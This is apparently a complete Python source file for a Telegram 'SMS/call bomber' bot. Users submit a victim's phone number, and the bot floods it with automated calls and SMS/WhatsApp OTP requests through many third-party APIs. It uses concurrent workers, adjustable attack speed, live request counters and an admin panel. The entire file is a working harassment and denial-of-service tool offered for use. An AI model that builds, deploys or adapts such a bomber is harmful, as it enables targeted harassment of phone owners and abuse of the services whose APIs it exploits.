# main.py – Advanced Telegram Bomber Bot (Final & Complete)
import os, logging, asyncio, json, io, time
from datetime import datetime
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
from telegram.constants import ParseMode
from aiohttp import web
import aiohttp

from database import *
from config import *

load_dotenv()
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- GLOBALS ----------
call_interval = DEFAULT_CALL_INTERVAL
sms_interval   = DEFAULT_SMS_INTERVAL

sms_queue = asyncio.Queue(maxsize=5000)
_worker_tasks = []
_session = None

bombing_active = {}          # "uid:phone" -> Event
request_counts = {}          # "uid:phone" -> int

# ---------- ASYNC DB WRAPPER ----------
async def async_db(func, *args, **kwargs):
    return await asyncio.to_thread(func, *args, **kwargs)

# ---------- SMS WORKER ENGINE ----------
async def sms_worker(session):
    while True:
        item = await sms_queue.get()
        if item is None:
            sms_queue.task_done()
            break
        api_conf, phone, on_done = item
        try:
            success = await _call_api(session, api_conf, phone)
            if on_done:
                await on_done(success)
        except Exception as e:
            logger.error(f"SMS worker error: {e}")
        finally:
            sms_queue.task_done()

async def _call_api(session, api_conf, phone, cc=DEFAULT_COUNTRY_CODE):
    method = api_conf["method"].upper()
    url = api_conf["url"].replace("{phone}", phone).replace("{CC}", cc)
    headers = api_conf.get("headers", {})
    data_raw = api_conf.get("data")

    json_data = None
    data = None
    if data_raw:
        data_str = data_raw.replace("{phone}", phone).replace("{CC}", cc)
        if "json" in headers.get("Content-Type", "").lower():
            try:
                json_data = json.loads(data_str)
            except:
                return False
        else:
            data = data_str

    timeout = aiohttp.ClientTimeout(total=10)
    try:
        if method == "GET":
            async with session.get(url, headers=headers, timeout=timeout) as resp:
                return resp.status == 200
        elif method == "POST":
            if json_data:
                async with session.post(url, headers=headers, json=json_data, timeout=timeout) as resp:
                    return resp.status == 200
            else:
                async with session.post(url, headers=headers, data=data, timeout=timeout) as resp:
                    return resp.status == 200
        else:
            return False
    except:
        return False

# ---------- PHONE NUMBER CLEANING ----------
def clean_phone_number(text: str) -> str | None:
    digits = ''.join(filter(str.isdigit, text))
    if len(digits) < 10:
        return None
    return digits[-10:]

# ---------- KEYBOARDS ----------
def main_menu_keyboard(user_id):
    buttons = [
        [InlineKeyboardButton("💣 Bomb", callback_data="bomb_start")],
        [InlineKeyboardButton("🛑 Stop", callback_data="cmd_stop"),
         InlineKeyboardButton("⚡ Speed Up", callback_data="cmd_speedup"),
         InlineKeyboardButton("🐢 Speed Down", callback_data="cmd_speeddown")],
        [InlineKeyboardButton("👤 My Account", callback_data="my_account")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")],
    ]
    if is_admin(user_id):
        buttons.append([InlineKeyboardButton("🛡 Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(buttons)

def admin_panel_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 List Users", callback_data="list_users:0"),
         InlineKeyboardButton("🕒 Recent Users", callback_data="recent_users:0")],
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
         InlineKeyboardButton("🔍 Lookup", callback_data="lookup_prompt")],
        [InlineKeyboardButton("📨 Broadcast", callback_data="broadcast_prompt"),
         InlineKeyboardButton("💬 DM", callback_data="dm_prompt")],
        [InlineKeyboardButton("💬 Bulk DM", callback_data="bulkdm_prompt")],
        [InlineKeyboardButton("👑 Add Admin", callback_data="addadmin_prompt"),
         InlineKeyboardButton("❌ Remove Admin", callback_data="removeadmin_prompt")],
        [InlineKeyboardButton("🔨 Ban", callback_data="ban_prompt"),
         InlineKeyboardButton("✅ Unban", callback_data="unban_prompt")],
        [InlineKeyboardButton("🗑 Delete User", callback_data="deleteuser_prompt")],
        [InlineKeyboardButton("🛡 Protected Numbers", callback_data="protected_numbers")],
        [InlineKeyboardButton("⏱ Set Call Interval", callback_data="setcallinterval_prompt"),
         InlineKeyboardButton("⏱ Set SMS Interval", callback_data="setsmsinterval_prompt")],
        [InlineKeyboardButton("💾 Backup", callback_data="backup"),
         InlineKeyboardButton("🔙 Back", callback_data="back_to_main")],
    ])

# ---------- BOMBING SESSION ----------
async def perform_bombing(user_id, phone, context):
    session_key = f"{user_id}:{phone}"
    stop_flag = asyncio.Event()
    bombing_active[session_key] = stop_flag
    request_counts[session_key] = 0

    async def on_sms_done(success):
        if not stop_flag.is_set():
            request_counts[session_key] += 1

    # Call loop
    async def call_loop():
        idx = 0
        async with aiohttp.ClientSession() as sess:
            while not stop_flag.is_set():
                api = CALL_APIS[idx]
                await _call_api(sess, api, phone)
                request_counts[session_key] += 1
                idx = (idx + 1) % len(CALL_APIS)
                try:
                    await asyncio.wait_for(stop_flag.wait(), timeout=call_interval)
                except asyncio.TimeoutError:
                    pass

    # SMS loop
    async def sms_loop():
        while not stop_flag.is_set():
            for api in SMS_APIS:
                if stop_flag.is_set():
                    break
                await sms_queue.put((api, phone, on_sms_done))
            try:
                await asyncio.wait_for(stop_flag.wait(), timeout=sms_interval)
            except asyncio.TimeoutError:
                pass

    # Status updater
    async def status_updater():
        last_cnt = 0
        last_time = 0
        while not stop_flag.is_set():
            await asyncio.sleep(1)
            cnt = request_counts.get(session_key, 0)
            now = time.time()
            if cnt > last_cnt and (now - last_time) >= TELEGRAM_RATE_LIMIT:
                msg = (f"📊 [{phone}] Requests: {cnt}\n"
                       f"⏱ Call each {call_interval}s | SMS round every {sms_interval}s{BRANDING}")
                await context.bot.send_message(chat_id=user_id, text=msg, parse_mode=ParseMode.HTML)
                last_cnt = cnt
                last_time = now

    # Auto-stop
    async def auto_stop():
        await asyncio.sleep(AUTO_STOP_SECONDS)
        if not stop_flag.is_set():
            stop_flag.set()

    tasks = [
        asyncio.create_task(call_loop()),
        asyncio.create_task(sms_loop()),
        asyncio.create_task(status_updater()),
        asyncio.create_task(auto_stop())
    ]

    await context.bot.send_message(
        chat_id=user_id,
        text=f"🔥 Bombing started on <code>{phone}</code>\n📞 Calls: {len(CALL_APIS)} APIs\n💬 SMS/WhatsApp: {len(SMS_APIS)} APIs{BRANDING}",
        parse_mode=ParseMode.HTML
    )

    await stop_flag.wait()

    for t in tasks:
        t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)

    cnt = request_counts.pop(session_key, 0)
    bombing_active.pop(session_key, None)
    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ [{phone}] Finished. Total requests: {cnt}{BRANDING}",
        parse_mode=ParseMode.HTML
    )

# ---------- COMMAND HANDLERS ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await async_db(add_user, user.id, user.username, user.first_name)
    await update.message.reply_text(
        f"Welcome {user.first_name}! 🤖\nUse the buttons below:{BRANDING}",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu_keyboard(user.id)
    )

async def menu_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Main Menu:", reply_markup=main_menu_keyboard(update.effective_user.id))

# ---------- CALLBACK HANDLER ----------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    await query.answer()

    # ----- User flows -----
    if data == "bomb_start":
        context.user_data["awaiting_bomb_number"] = True
        await query.edit_message_text("📱 Please send the target phone number (10 digits):")
        return

    elif data == "cmd_stop":
        uid = query.from_user.id
        active = {k: v for k, v in bombing_active.items() if k.startswith(f"{uid}:") and not v.is_set()}
        if not active:
            await query.edit_message_text("ℹ️ No active bombing.", reply_markup=main_menu_keyboard(uid))
            return

        if len(active) == 1:
            key = list(active.keys())[0]
            active[key].set()
            phone = key.split(":", 1)[1]
            await query.edit_message_text(f"🛑 Stopped bombing on {phone}", reply_markup=main_menu_keyboard(uid))
        else:
            buttons = []
            for key, event in active.items():
                phone = key.split(":", 1)[1]
                buttons.append([InlineKeyboardButton(f"📱 {phone}", callback_data=f"stop_session:{key}")])
            buttons.append([InlineKeyboardButton("🛑 Stop All", callback_data=f"stop_all:{uid}")])
            buttons.append([InlineKeyboardButton("🔙 Cancel", callback_data="back_to_main")])
            await query.edit_message_text("Select which bombing to stop:", reply_markup=InlineKeyboardMarkup(buttons))
        return

    elif data == "cmd_speedup":
        uid = query.from_user.id
        if not any(k.startswith(f"{uid}:") and not v.is_set() for k, v in bombing_active.items()):
            await query.edit_message_text("No active bombing.", reply_markup=main_menu_keyboard(uid))
            return
        global call_interval, sms_interval
        call_interval = max(MIN_CALL_INTERVAL, call_interval - 5)
        sms_interval   = max(MIN_SMS_INTERVAL, sms_interval - 1)
        await query.edit_message_text(f"⚡ Speed increased. Call {call_interval}s, SMS {sms_interval}s")
        return

    elif data == "cmd_speeddown":
        uid = query.from_user.id
        if not any(k.startswith(f"{uid}:") and not v.is_set() for k, v in bombing_active.items()):
            await query.edit_message_text("No active bombing.", reply_markup=main_menu_keyboard(uid))
            return
        call_interval = min(MAX_INTERVAL, call_interval + 5)
        sms_interval   = min(MAX_INTERVAL, sms_interval + 1)
        await query.edit_message_text(f"🐢 Speed decreased. Call {call_interval}s, SMS {sms_interval}s")
        return

    elif data == "my_account":
        uid = query.from_user.id
        user = await async_db(get_user_by_id, uid)
        phone = user.get("user_phone") or "Not set"
        text = f"👤 Your Account\nID: {uid}\nPhone: {phone}\nRole: {user['role']}{BRANDING}"
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard(uid))
        return

    elif data == "help":
        text = (
            "💣 Bomb – Start a bombing session\n"
            "🛑 Stop – Stop one or all sessions\n"
            "⚡ Speed Up / 🐢 Speed Down – Adjust timing\n"
            "👤 My Account – Your info\n"
            "ℹ️ Help – This message"
        )
        await query.edit_message_text(text, reply_markup=main_menu_keyboard(query.from_user.id))
        return

    # ----- Stop session / all -----
    elif data.startswith("stop_session:"):
        key = data.split(":", 1)[1]
        flag = bombing_active.get(key)
        if flag and not flag.is_set():
            flag.set()
            phone = key.split(":", 1)[1]
            await query.edit_message_text(f"✅ Stopped bombing on {phone}", reply_markup=main_menu_keyboard(query.from_user.id))
        else:
            await query.edit_message_text("Session already stopped.", reply_markup=main_menu_keyboard(query.from_user.id))
        return

    elif data.startswith("stop_all:"):
        uid = query.from_user.id
        stopped = 0
        for key, event in bombing_active.items():
            if key.startswith(f"{uid}:") and not event.is_set():
                event.set()
                stopped += 1
        await query.edit_message_text(f"🛑 Stopped all {stopped} sessions.", reply_markup=main_menu_keyboard(uid))
        return

    # ----- Admin panel -----
    elif data == "admin_panel":
        if not is_admin(query.from_user.id):
            await query.edit_message_text("Access denied.")
            return
        await query.edit_message_text("🛡 Admin Panel:", reply_markup=admin_panel_keyboard())
        return

    # Admin list / recent pagination
    elif data.startswith("list_users"):
        page = int(data.split(":")[1]) if ":" in data else 0
        users = await async_db(get_all_users_paginated, page, 10)
        if not users:
            await query.edit_message_text("No users.", reply_markup=admin_panel_keyboard())
            return
        text = f"👥 Users (page {page+1}):\n"
        for u in users:
            text += f"`{u['user_id']}` @{u['username'] or 'no'} {u['first_name'] or ''}\n"
        buttons = []
        if page > 0:
            buttons.append(InlineKeyboardButton("◀️", callback_data=f"list_users:{page-1}"))
        if len(users) == 10:
            buttons.append(InlineKeyboardButton("▶️", callback_data=f"list_users:{page+1}"))
        buttons.append(InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([buttons]), parse_mode=ParseMode.MARKDOWN)
        return

    elif data.startswith("recent_users"):
        page = int(data.split(":")[1]) if ":" in data else 0
        users = await async_db(get_recent_users_paginated, page, 10)
        if not users:
            await query.edit_message_text("No recent users.", reply_markup=admin_panel_keyboard())
            return
        text = f"🕒 Recent (7d) page {page+1}:\n"
        for u in users:
            text += f"`{u['user_id']}` @{u['username'] or 'no'} {u['joined_at']}\n"
        buttons = []
        if page > 0:
            buttons.append(InlineKeyboardButton("◀️", callback_data=f"recent_users:{page-1}"))
        if len(users) == 10:
            buttons.append(InlineKeyboardButton("▶️", callback_data=f"recent_users:{page+1}"))
        buttons.append(InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([buttons]), parse_mode=ParseMode.MARKDOWN)
        return

    elif data == "admin_stats":
        cnt = await async_db(get_user_count)
        await query.edit_message_text(f"📊 Total users: {cnt}{BRANDING}", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
        return

    # Admin prompts (set flags)
    admin_prompts = {
        "lookup_prompt": ("admin_lookup", "Enter user ID to lookup:"),
        "broadcast_prompt": ("broadcast", "Send the message you want to broadcast:"),
        "dm_prompt": ("admin_dm", "Enter target user ID followed by message (e.g., 123456 Hello):"),
        "bulkdm_prompt": ("bulkdm", "Enter comma-separated user IDs followed by message:"),
        "ban_prompt": ("ban", "Enter user ID to ban:"),
        "unban_prompt": ("unban", "Enter user ID to unban:"),
        "deleteuser_prompt": ("deleteuser", "Enter user ID to delete:"),
        "addadmin_prompt": ("addadmin", "Enter user ID to promote to admin:"),
        "removeadmin_prompt": ("removeadmin", "Enter user ID to demote:"),
        "setcallinterval_prompt": ("set_call_interval", "Enter new call interval in seconds (min 10):"),
        "setsmsinterval_prompt": ("set_sms_interval", "Enter new SMS interval in seconds (min 2):"),
    }
    if data in admin_prompts:
        flag, msg = admin_prompts[data]
        context.user_data[flag] = True
        await query.edit_message_text(msg)
        return

    # Protected numbers
    elif data == "protected_numbers":
        if not is_admin(query.from_user.id):
            return
        nums = await async_db(get_all_protected_numbers)
        if not nums:
            await query.edit_message_text(
                "No protected numbers yet.\nUse ➕ Add Number to protect one.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("➕ Add Number", callback_data="add_protected_prompt")],
                    [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]
                ])
            )
        else:
            buttons = []
            for num in nums:
                buttons.append([InlineKeyboardButton(f"📱 {num}  ❌", callback_data=f"del_protected:{num}")])
            buttons.append([InlineKeyboardButton("➕ Add Number", callback_data="add_protected_prompt")])
            buttons.append([InlineKeyboardButton("🔙 Back", callback_data="admin_panel")])
            await query.edit_message_text(
                f"🛡 Protected Numbers ({len(nums)}):",
                reply_markup=InlineKeyboardMarkup(buttons)
            )
        return

    elif data.startswith("del_protected:"):
        num = data.split(":", 1)[1]
        ok = await async_db(remove_protected_number, num)
        await query.answer(f"{'Removed' if ok else 'Not found'}")
        nums = await async_db(get_all_protected_numbers)
        buttons = []
        for n in nums:
            buttons.append([InlineKeyboardButton(f"📱 {n}  ❌", callback_data=f"del_protected:{n}")])
        buttons.append([InlineKeyboardButton("➕ Add Number", callback_data="add_protected_prompt")])
        buttons.append([InlineKeyboardButton("🔙 Back", callback_data="admin_panel")])
        await query.edit_message_text(
            f"🛡 Protected Numbers ({len(nums)}):",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return

    elif data == "add_protected_prompt":
        context.user_data["add_protected"] = True
        await query.edit_message_text("📱 Enter the 10‑digit number to protect:")
        return

    elif data == "backup":
        users = await async_db(get_all_users_paginated, 0, 999999)
        data_json = json.dumps([dict(u) for u in users], default=str, indent=2)
        file = io.BytesIO(data_json.encode())
        file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        await query.message.reply_document(document=file, filename=file.name)
        await query.edit_message_text("Backup sent.", reply_markup=admin_panel_keyboard())
        return

    elif data == "back_to_main":
        await query.edit_message_text("Main Menu:", reply_markup=main_menu_keyboard(query.from_user.id))
        return

# ---------- TEXT HANDLER ----------
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user_data = context.user_data
    text = update.message.text.strip()

    # Bomb number input
    if user_data.get("awaiting_bomb_number"):
        user_data["awaiting_bomb_number"] = False
        phone = clean_phone_number(text)
        if not phone:
            await update.message.reply_text(
                "❌ Invalid number! Please send a valid 10‑digit mobile number.\n"
                "Example: 9876543210, +91-9876543210, 919876543210"
            )
            return

        if await async_db(is_protected_number, phone):
            await update.message.reply_text("❌ This number is globally protected and cannot be bombed.")
            return

        raw_user_phone = await async_db(get_user_phone, uid)
        user_phone = clean_phone_number(raw_user_phone) if raw_user_phone else None
        if user_phone and user_phone == phone:
            await update.message.reply_text("❌ Self‑bombing not allowed.")
            return

        asyncio.create_task(perform_bombing(uid, phone, context))
        return

    # Admin prompts
    # Lookup
    if user_data.get("admin_lookup"):
        user_data["admin_lookup"] = False
        try:
            tid = int(text)
        except:
            await update.message.reply_text("Invalid ID.")
            return
        user = await async_db(get_user_by_id, tid)
        if not user:
            await update.message.reply_text("User not found.")
            return
        target = await async_db(get_user_target, tid) or "None"
        msg = (f"🔍 User: {tid}\nName: {user['first_name']}\nUsername: @{user['username']}\n"
               f"Role: {user['role']}\nBanned: {bool(user['banned'])}\nTarget: {target}{BRANDING}")
        await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
        return

    # Ban
    if user_data.get("ban"):
        user_data["ban"] = False
        try:
            tid = int(text)
        except:
            await update.message.reply_text("Invalid ID.")
            return
        ok = await async_db(ban_user, tid)
        await update.message.reply_text(f"🔨 User {tid} banned." if ok else "User not found.")
        return

    # Unban
    if user_data.get("unban"):
        user_data["unban"] = False
        try:
            tid = int(text)
        except:
            await update.message.reply_text("Invalid ID.")
            return
        ok = await async_db(unban_user, tid)
        await update.message.reply_text(f"✅ User {tid} unbanned." if ok else "User not found or not banned.")
        return

    # Delete user
    if user_data.get("deleteuser"):
        user_data["deleteuser"] = False
        try:
            tid = int(text)
        except:
            await update.message.reply_text("Invalid ID.")
            return
        ok = await async_db(delete_user, tid)
        await update.message.reply_text(f"🗑 User {tid} deleted." if ok else "User not found.")
        return

    # Broadcast
    if user_data.get("broadcast"):
        user_data["broadcast"] = False
        ids = await async_db(get_all_user_ids)
        success = 0
        for target in ids:
            try:
                await context.bot.send_message(chat_id=target, text=text + BRANDING, parse_mode=ParseMode.HTML)
                success += 1
                await asyncio.sleep(0.05)
            except:
                pass
        await update.message.reply_text(f"📨 Broadcast sent to {success}/{len(ids)} users.")
        return

    # DM (format: <id> <message>)
    if user_data.get("admin_dm"):
        user_data["admin_dm"] = False
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await update.message.reply_text("Usage: <user_id> <message>")
            return
        try:
            tid = int(parts[0])
        except:
            await update.message.reply_text("Invalid user ID.")
            return
        msg = parts[1] + BRANDING
        try:
            await context.bot.send_message(chat_id=tid, text=msg, parse_mode=ParseMode.HTML)
            await update.message.reply_text(f"💬 Message sent to {tid}.")
        except Exception as e:
            await update.message.reply_text(f"Failed: {e}")
        return

    # Bulk DM (format: id1,id2,... message)
    if user_data.get("bulkdm"):
        user_data["bulkdm"] = False
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await update.message.reply_text("Usage: <id1,id2,...> <message>")
            return
        id_strs = parts[0].split(",")
        msg = parts[1] + BRANDING
        success = 0
        for s in id_strs:
            try:
                tid = int(s.strip())
                await context.bot.send_message(chat_id=tid, text=msg, parse_mode=ParseMode.HTML)
                success += 1
            except:
                pass
        await update.message.reply_text(f"💬 Bulk DM sent to {success}/{len(id_strs)} users.")
        return

    # Add admin
    if user_data.get("addadmin"):
        user_data["addadmin"] = False
        try:
            tid = int(text)
        except:
            await update.message.reply_text("Invalid ID.")
            return
        await async_db(set_admin_role, tid, True)
        await update.message.reply_text(f"👑 User {tid} promoted to admin.")
        return

    # Remove admin
    if user_data.get("removeadmin"):
        user_data["removeadmin"] = False
        try:
            tid = int(text)
        except:
            await update.message.reply_text("Invalid ID.")
            return
        await async_db(set_admin_role, tid, False)
        await update.message.reply_text(f"❌ User {tid} demoted.")
        return

    # Set call interval
    if user_data.get("set_call_interval"):
        user_data["set_call_interval"] = False
        try:
            sec = int(text)
        except:
            await update.message.reply_text("Invalid number.")
            return
        global call_interval
        call_interval = max(MIN_CALL_INTERVAL, sec)
        await update.message.reply_text(f"✅ Call interval set to {call_interval}s.")
        return

    # Set SMS interval
    if user_data.get("set_sms_interval"):
        user_data["set_sms_interval"] = False
        try:
            sec = int(text)
        except:
            await update.message.reply_text("Invalid number.")
            return
        global sms_interval
        sms_interval = max(MIN_SMS_INTERVAL, sec)
        await update.message.reply_text(f"✅ SMS interval set to {sms_interval}s.")
        return

    # Add protected number
    if user_data.get("add_protected"):
        user_data["add_protected"] = False
        phone = clean_phone_number(text)
        if not phone:
            await update.message.reply_text("❌ Invalid number. Must contain at least 10 digits.")
            return
        await async_db(add_protected_number, phone)
        await update.message.reply_text(f"✅ {phone} added to protected list. No one can bomb it.")
        return

# ---------- AIOHTTP SERVER & KEEP-ALIVE ----------
async def keep_alive():
    """Ping our own /ping endpoint every 5 minutes to prevent Render sleep."""
    await asyncio.sleep(60)
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(f"http://localhost:{PORT}/ping") as resp:
                    logger.info(f"Keep-alive ping: {resp.status}")
            except Exception as e:
                logger.error(f"Keep-alive error: {e}")
            await asyncio.sleep(300)

async def webhook_handler(request):
    """Process Telegram updates."""
    try:
        await ptb_app.process_update(request)
    except Exception as e:
        logger.error(f"Webhook error: {e}")
    return web.Response(status=200)

async def ping_handler(request):
    return web.Response(text="pong")

ptb_app = None

# ---------- MAIN ----------
def main():
    global ptb_app
    init_db()
    ptb_app = Application.builder().token(BOT_TOKEN).build()

    ptb_app.add_handler(CommandHandler("start", start))
    ptb_app.add_handler(CommandHandler("menu", menu_cmd))
    ptb_app.add_handler(CallbackQueryHandler(button_handler))
    ptb_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    async def on_startup(app_web):
        global _session, _worker_tasks
        _session = aiohttp.ClientSession()
        _worker_tasks = [asyncio.create_task(sms_worker(_session)) for _ in range(20)]
        logger.info("SMS workers started")
        asyncio.create_task(keep_alive())

    async def on_shutdown(app_web):
        global _session, _worker_tasks
        for _ in range(20):
            await sms_queue.put(None)
        await asyncio.gather(*_worker_tasks, return_exceptions=True)
        if _session:
            await _session.close()
        logger.info("SMS workers stopped")

    aiohttp_app = web.Application()
    aiohttp_app.router.add_post("/webhook", webhook_handler)
    aiohttp_app.router.add_get("/ping", ping_handler)
    aiohttp_app.on_startup.append(on_startup)
    aiohttp_app.on_shutdown.append(on_shutdown)

    webhook_url = f"{WEBHOOK_BASE}/webhook" if WEBHOOK_BASE else None
    if not webhook_url:
        logger.error("WEBHOOK_BASE not set. Set RENDER_EXTERNAL_URL env.")
        return

    async def set_webhook():
        await ptb_app.bot.set_webhook(url=webhook_url)
        logger.info(f"Webhook set to {webhook_url}")

    ptb_app.post_init = set_webhook

    web.run_app(aiohttp_app, host="0.0.0.0", port=PORT)

if __name__ == "__main__":
    main()
